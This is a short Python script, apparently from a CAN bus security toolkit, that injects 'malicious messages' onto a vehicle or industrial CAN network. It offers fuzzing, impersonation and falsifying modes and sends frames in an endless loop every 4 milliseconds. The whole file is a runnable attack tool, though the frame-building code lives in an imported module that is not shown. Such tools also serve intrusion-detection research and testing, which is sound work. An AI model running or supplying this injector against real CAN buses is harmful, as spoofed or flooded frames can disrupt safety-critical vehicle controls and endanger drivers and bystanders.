from CAN_Invaders.connection.connector import CAN_Bus
import argparse
import time

argparser = argparse.ArgumentParser(description='CAN Bus Generator of Malicious Messages')
argparser.add_argument('-i', '--interface', type=str, default="socketcan", help='CAN Bus Interface')
argparser.add_argument('-c', '--channel', type=str, default="can0", help='CAN Bus Channel')
argparser.add_argument('-b', '--bitrate', type=str, default="500000", help='CAN Bus Bitrate')
argparser.add_argument('-t', '--type', type=str, default="fuzzing", help='Type of the messages to be generated')
argparser.add_argument('-s', '--sleep', type=float, default=0.004, help='Attack interval in seconds')
argparser.add_argument('-m', '--message', nargs=3, type=int, default=[0,1,0], help='id, dlc, and if it is binary or not (impersonation or falsifying attack)')
args = argparser.parse_args()

bus = CAN_Bus(interface=args.interface,
              channel=args.channel, 
              bitrate=args.bitrate)

while(True):
    time.sleep(args.sleep)
    bus.send_message(bus, type=args.type, id=args.message[0], dlc=args.message[1], binary=args.message[2])
    
